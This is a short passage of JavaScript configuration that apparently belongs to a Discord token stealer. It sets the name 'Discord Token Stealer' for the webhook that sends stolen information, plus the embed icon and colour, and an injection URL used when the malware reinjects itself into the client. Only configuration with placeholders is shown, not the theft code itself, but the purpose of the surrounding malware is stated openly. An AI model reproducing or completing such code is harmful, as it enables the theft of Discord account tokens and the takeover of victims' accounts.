...
const config = {
  ...
  embed_name: 'Discord Token Stealer', //name of the webhook thats gonna send the info
  embed_icon: '%AVATAR_PFP%'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  embed_color: 16714752, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
  injection_url: '%INJECTION_URL%', //injection url for when it reinjects
  /**
